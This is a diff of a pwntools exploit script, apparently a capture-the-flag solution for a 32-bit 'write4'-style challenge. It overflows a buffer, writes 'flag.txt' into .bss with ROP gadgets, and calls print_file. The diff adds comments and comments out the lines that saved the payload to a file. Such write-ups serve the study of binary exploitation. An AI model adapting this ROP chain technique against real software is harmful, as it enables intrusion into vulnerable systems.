@@ -47,12 +47,12 @@ r = ROP(elf)
 
 pop_edi_ebp_rep = 0x080485aa
 mov = 0x08048543
-bss = elf.bss()
+bss = elf.bss() #uninitialized data
 
-#main - offset
+#offset
 r.raw(cyclic(44))
 
-# 1st write
+# 1st write (cant fit 'flag.txt' in 32bits)
 r.raw(pop_edi_ebp_rep)
 r.raw(p32(bss))
 r.raw(b'flag')  
@@ -60,7 +60,7 @@ r.raw(mov)
 
 # 2nd write
 r.raw(pop_edi_ebp_rep)
-r.raw(p32(bss+4))
+r.raw(p32(bss+4)) #we filled 4 bytes  +4
 r.raw(b'.txt')
 r.raw(mov)
 
@@ -69,9 +69,9 @@ r.call('print_file', [bss])
 payload = r.chain()
 print(r.dump())
 
-with open("tmp","w") as f:
-    f.write(payload)
-    f.close()
+#with open("tmp","w") as f:
+#    f.write(payload)
+#    f.close()
 
 io.recvuntil('>')
 io.sendline(payload)
